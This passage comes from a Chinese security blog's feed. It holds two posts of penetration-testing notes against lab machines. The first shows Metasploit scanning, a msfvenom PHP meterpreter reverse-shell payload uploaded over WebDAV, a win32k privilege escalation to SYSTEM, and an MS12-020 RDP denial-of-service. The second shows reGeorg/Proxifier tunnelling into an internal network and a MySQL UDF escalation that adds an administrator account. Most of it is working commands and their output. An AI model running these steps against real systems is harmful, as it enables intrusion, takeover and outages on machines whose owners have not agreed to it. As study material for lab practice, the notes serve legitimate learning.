class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> rhosts <span class="comment">192.168.1.44</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.1.44</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set threads 30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.1.44</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/cgi-bin/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/doc/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/icons/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/index/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/phpMyAdmin/<span class="comment"> 200 (192.168.1.44)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.1.44:80</span>/test/<span class="comment"> 404 (192.168.1.44)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure><h1 id="msf反弹shell（桥接模式下）"><a href="#msf反弹shell（桥接模式下）" class="headerlink" title="msf反弹shell（桥接模式下）"></a>msf反弹shell（桥接模式下）</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>msfvenom -p php/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=62222 -f raw &gt; ~/Desktop/62222.php</span><br><span class="line"><span class="bullet">2. </span>davtest -url http://192.168.1.66:8585/uploads -uploadfile ~/Desktop/62222.php -uploadloc 62222.php</span><br><span class="line"><span class="bullet">3. </span>use exploit/multi/handler </span><br><span class="line"><span class="bullet">4. </span>set payload php/meterpreter<span class="emphasis">_reverse_</span>tcp </span><br><span class="line"><span class="bullet">5. </span>show options</span><br><span class="line"><span class="bullet">6. </span>run</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Started</span> <span class="selector-tag">reverse</span> <span class="selector-tag">TCP</span> <span class="selector-tag">handler</span> <span class="selector-tag">on</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.181</span><span class="selector-pseudo">:61111</span> </span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.181</span><span class="selector-pseudo">:61111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.66</span><span class="selector-pseudo">:53920)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-22</span> 13<span class="selector-pseudo">:34</span><span class="selector-pseudo">:42</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure><ul><li>getuid查看用户</li><li>background(把会话放置后台)</li><li>sessions -l </li></ul><h1 id="利用ms18-8120提权"><a href="#利用ms18-8120提权" class="headerlink" title="利用ms18-8120提权"></a>利用ms18-8120提权</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/multi/<span class="keyword">handler</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>  <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----  ---------------  --------  -----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>   <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----   ---------------  --------  -----------</span></span><br><span class="line">   LHOST  <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>     yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT  <span class="number">61111</span>            yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">31111</span></span><br><span class="line">lport =&gt; <span class="number">31111</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> </span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51745</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">15</span>:<span class="number">59</span>:<span class="number">07</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="keyword">Server</span> username: <span class="keyword">LOCAL</span> SERVICE (<span class="number">0</span>)</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding <span class="keyword">session</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/multi/<span class="keyword">handler</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>  <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----  ---------------  --------  -----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>        <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----        ---------------  --------  -----------</span></span><br><span class="line">   EXITFUNC    process          yes       <span class="keyword">Exit</span> technique (Accepted: <span class="string">''</span>, seh, <span class="keyword">thread</span>, process, <span class="keyword">none</span>)</span><br><span class="line">   EXTENSIONS                   <span class="keyword">no</span>        Comma-separate <span class="keyword">list</span> <span class="keyword">of</span> extensions <span class="keyword">to</span> <span class="keyword">load</span></span><br><span class="line">   EXTINIT                      <span class="keyword">no</span>        Initialization strings <span class="keyword">for</span> extensions</span><br><span class="line">   LHOST       <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>    yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT       <span class="number">31111</span>            yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">32222</span></span><br><span class="line">lport =&gt; <span class="number">32222</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; exploit -j -z</span><br><span class="line">[*] Exploit running <span class="keyword">as</span> background job <span class="number">1.</span></span><br><span class="line">[*] Exploit completed, but <span class="keyword">no</span> <span class="keyword">session</span> was created.</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> </span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; sessions <span class="number">1</span></span><br><span class="line">[*] <span class="keyword">Starting</span> interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; <span class="keyword">execute</span> -f <span class="string">"C:\\wamp\\www\\uploads\\32222.exe"</span></span><br><span class="line">Process <span class="number">11680</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter <span class="keyword">session</span> <span class="number">2</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51969</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">16</span>:<span class="number">02</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding <span class="keyword">session</span> <span class="number">1.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Id</span>  <span class="keyword">Name</span>  <span class="keyword">Type</span>                     Information                                   <span class="keyword">Connection</span></span><br><span class="line">  <span class="comment">--  ----  ----                     -----------                                   ----------</span></span><br><span class="line">  <span class="number">1</span>         meterpreter php/windows  <span class="keyword">LOCAL</span> SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">31111</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51745</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/windows  NT AUTHORITY\<span class="keyword">LOCAL</span> SERVICE @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">32222</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">51969</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ms18_8120_win32k_privescmsf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>     <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----     ---------------  --------  -----------</span></span><br><span class="line">   <span class="keyword">SESSION</span>                   yes       The <span class="keyword">session</span> <span class="keyword">to</span> run this <span class="keyword">module</span> on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   <span class="keyword">Automatic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; <span class="keyword">set</span> <span class="keyword">session</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">session</span> =&gt; <span class="number">2</span></span><br><span class="line">msf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, <span class="keyword">wait</span> <span class="keyword">for</span> privileged payload execution <span class="keyword">to</span> complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> <span class="keyword">bytes</span>) <span class="keyword">to</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span></span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">52455</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">16</span>:<span class="number">04</span>:<span class="number">23</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="keyword">Server</span> username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure><h1 id="ms12-020远程蓝屏"><a href="#ms12-020远程蓝屏" class="headerlink" title="ms12-020远程蓝屏"></a>ms12-020远程蓝屏</h1><ol><li><p>检测</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/ms12_020_check):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT    3389             <span class="literal">yes</span>       Remote<span class="built_in"> port </span>running RDP (TCP)</span><br><span class="line">   THREADS  1                <span class="literal">yes</span>       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="builtin-name">set</span> threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="builtin-name">set</span> rhosts 192.168.1.66</span><br><span class="line">rhosts =&gt; 192.168.1.66</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.66:3389     - 192.168.1.66:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.66:3389     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></li><li><p>执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids </span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT   3389             <span class="literal">yes</span>       The target<span class="built_in"> port </span>(TCP)</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="builtin-name">set</span> rhosts 192.168.1.66</span><br><span class="line">rhosts =&gt; 192.168.1.66</span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - Checking RDP status<span class="built_in">..</span>.</span><br><span class="line">[+] 192.168.1.66:3389 - 192.168.1.66:3389 seems down</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;nmap常见参数&quot;&gt;&lt;a href=&quot;#nmap常见参数&quot; class=&quot;headerlink&quot; title=&quot;nmap常见参数&quot;&gt;&lt;/a&gt;nmap常见参数&lt;/h1&gt;&lt;h2 id=&quot;HOST-DISCOVERY主机发现&quot;&gt;&lt;a href=&quot;#HOST-DISCOVERY主机发现&quot; class=&quot;headerlink&quot; title=&quot;HOST DISCOVERY主机发现&quot;&gt;&lt;/a&gt;HOST DISCOVERY主机发现&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;-sL：简单列出扫描的目标&lt;/li&gt;
&lt;li&gt;-sn：不做端口扫描，只进行主机发现&lt;/li&gt;
&lt;li&gt;-PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口&lt;/li&gt;
&lt;li&gt;-n：不做DNS解析&lt;/li&gt;
&lt;li&gt;-R：总是做DNS反向解析
    
    </summary>
    
      <category term="工具使用" scheme="https://cy9nusg4rd3n.github.io/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="nmap" scheme="https://cy9nusg4rd3n.github.io/tags/nmap/"/>
    
      <category term="msf" scheme="https://cy9nusg4rd3n.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>reGeorg+Proxifier内网穿透及提权模拟</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/01/27/reGeorg-Proxifier%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%8F%8A%E6%8F%90%E6%9D%83%E6%A8%A1%E6%8B%9F/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/01/27/reGeorg-Proxifier内网穿透及提权模拟/</id>
    <published>2019-01-27T06:26:04.000Z</published>
    <updated>2020-04-18T03:17:47.975Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table><thead><tr><th>IP地址</th><th>备注</th></tr></thead><tbody><tr><td>192.168.117.44</td><td>主机</td></tr><tr><td>192.168.96.243</td><td>虚拟机(桥接)</td></tr><tr><td>192.168.75.131</td><td>虚拟机(NAT)</td></tr></tbody></table><a id="more"></a><ul><li>ps:主机连的是wifi，其他人的都在96网段，我的不知道扯了什么在117网段，但主机和桥接之间能正常访问，但桥接的虚拟机(kali)无法访问NAT的虚拟机(windows)，现在目的是实现kali访问windows</li></ul><h2 id="reGeorg-Proxifier"><a href="#reGeorg-Proxifier" class="headerlink" title="reGeorg+Proxifier"></a>reGeorg+Proxifier</h2><ul><li>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高结合Proxifier使用</li><li>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链</li></ul><ol><li>在getshell情况下把对应所需类型文件上传,这里是<strong>tunnel.nosocket.php</strong></li><li>访问<strong><a href="http://192.168.117.44/tunnel.nosocket.php" target="_blank" rel="noopener">http://192.168.117.44/tunnel.nosocket.php</a></strong></li><li><p>然后攻击机运行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="number">8555</span> -u http:<span class="comment">//192.168.117.44/tunnel.nosocket.php</span></span><br></pre></td></tr></table></figure></li><li><p>windows下运行Proxifier,然后Profile-&gt;Proxy-Servers</p></li></ol><table><thead><tr><th>Address</th><th>Port</th><th>Type</th></tr></thead><tbody><tr><td>127.0.0.1</td><td>8555</td><td>SOCKS5</td></tr></tbody></table><ol start="5"><li><p>linux下修改proxychains配置</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8555</span></span><br></pre></td></tr></table></figure></li><li><p>运行的时候在程序前面加上proxychains就可以了</p><blockquote><p>proxychains firefox</p></blockquote></li><li>然后就能访问啦</li></ol><h1 id="MySQLudf提权"><a href="#MySQLudf提权" class="headerlink" title="MySQLudf提权"></a>MySQLudf提权</h1><h2 id="MySQL-udf"><a href="#MySQL-udf" class="headerlink" title="MySQL udf"></a>MySQL udf</h2><ol><li><strong>user defined function</strong>，用户定义函数,为用户提供了一种高效创建函数的方式</li><li>udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。</li><li><p>udf.dll默认路径,没有就要自己创建plugin</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小于mysql5.1版本 </span><br><span class="line">C:<span class="symbol">\W</span>INDOWS<span class="symbol">\u</span>df.dll 或 C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\u</span>df.dll </span><br><span class="line">等于mysql5.1版本 </span><br><span class="line"><span class="variable">%mysql%</span><span class="symbol">\p</span>lugin<span class="symbol">\u</span>df.dll 用 select @@plugin_dir 查询plugin路径 </span><br><span class="line">默认 C:<span class="symbol">\P</span>rogram Files<span class="symbol">\M</span>ySQL<span class="symbol">\l</span>ib<span class="symbol">\p</span>lugin<span class="symbol">\u</span>df.dll</span><br></pre></td></tr></table></figure></li><li><p>getshell后传大马登陆<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190126185714.png?raw=true" alt=""></p></li><li>也可以添加用户提升为管理员<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell('net <span class="keyword">user</span> <span class="title">udftest</span> <span class="number">123456</span> /add &amp; net localgroup administrators udftest /add')</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190126190440.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
